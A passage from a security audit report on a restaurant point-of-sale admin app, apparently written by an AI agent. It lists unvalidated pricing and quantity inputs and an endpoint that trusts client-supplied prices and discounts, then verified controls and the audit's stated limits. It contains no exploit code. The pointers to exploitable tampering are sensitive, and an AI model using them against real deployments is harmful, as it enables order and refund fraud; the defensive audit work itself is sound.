- Client uses JS floats in rupees with ad-hoc rounding (guest cart `GuestQrOrderingPage.tsx:214-218`, `createCustomerQrOrder` 4514-4520); GST hard-coded 2.5+2.5% ignoring configured tax groups; no upper bounds on price/refund/quantity (`ItemModal.tsx:112-116`, `repositories.ts:4468` accepts fractional/huge quantities: only `<= 0` rejected); bulk price adjust mutates every dish without bounds or audit actor (`App.tsx:519-536`). Not a boundary violation by itself because the same-browser client is the price authority; becomes exploitable only where a server trusts these numbers (Local Core `/api/orders` does: `local_service.cjs:326-372` trusts `unitPrice`/`discountAmount`, cross-slice F-026).

## Controls verified OK
- Access token kept in memory only: `cloudClient.ts:66,152,167`.
- Login has no local fallback ("cannot grant access on username/role match alone"): `App.tsx:281-289`.
- No `dangerouslySetInnerHTML` fed by user data: only `QrCardDesignerModal.tsx:500` with `generateQrSvg` output built from a boolean module matrix (`qrcode.ts:299-321`), safe. No `innerHTML/eval/document.write/new Function/srcdoc` anywhere in `pos-admin/src` or `packages/**`.
- Printing uses DOM class isolation, not string HTML: `packages/ui/src/printElement.ts:126-160`.
- WhatsApp links are digits-only plus `encodeURIComponent`: `CustomersCrmModule.tsx:315-320`, `MarketingCampaignsModal.tsx:66-68`.
- Support attachment download is a blob `download` link (no navigation/render): `SupportTicketsModule.tsx:296-305`.
- Rust printing: printer name allow-list and env-var passing (no script interpolation) `printing.rs:is_safe_printer_name`, `print_raw_to_system_printer`; COM range + baud allow-list (`normalize_com_port`, `is_supported_baud`); network scan restricted to private /24 (`subnet_prefix`); unit tests cover these.
- Licence certificates are ECDSA-P256 verified against baked public keys only: `license_certificate.ts:66-95`.
- QR guest orders are created `paymentStatus:'PENDING'`, catalogue-validated modifiers, min/max order value re-checked on the recomputed total: `repositories.ts:4483-4520,4575`.
- Server-side owner-only checks for creating/disabling tenant logins: `tenant-auth.service.ts:670,725`; password-reset OTP hashed, 5 attempts, 15 min, constant-time compare, non-enumerating: `tenant-auth.service.ts:799-895`.
- DeviceAuthGuard denies revoked/suspended/locked devices and lapsed subscriptions on every device call: `device-auth.guard.ts:52-118`.
- Refund endpoint limited to POS/POS_ADMIN device types (improvement over old audit): `payment-orders.controller.ts:32`.
- No secrets/API keys/integration credentials in the pos-admin bundle or tauri.conf; payment-gateway credentials are not handled by this app (grep for key/secret/webhook/razorpay/razorpay in src = none).
- No `withGlobalTauri`, no capabilities granted to `tauri-plugin-shell`, so plugin commands are not exposed.

## Not verified / limits
- No runtime test: exploit chains (POSADMIN-01/02/04) are code-traces across pos-admin, `packages/database`, cloud/api; not executed. POSADMIN-02 assumes POS/Captain/KDS/Kiosk pull STAFF_USER with the same `applyRemoteUser`; the comment in `push-entity-sync.dto.ts:3-8` says so but I did not open those apps.
- Deployment topology unknown: whether guest phones ever load this bundle from a reachable host and whether the Local Core gate (`local_service.cjs:40`) is enabled in production (POSADMIN-05, F-008 reachability).
- The 55 remaining components were sink-scanned, not read; business rules in ReportPreview/EodZ documents, inventory recipes, loyalty math were not reviewed for arithmetic errors.
- `Cargo.lock`/`package-lock` dependency advisories not checked (no `cargo audit`/`npm audit`); Tauri 2.x patch level not confirmed; installer output not inspected.
- Cloud slices mentioned (F-001, F-010, F-020, F-036 server side, entity-sync authz) were verified only as they touch pos-admin; the owning agent should confirm and rate them.
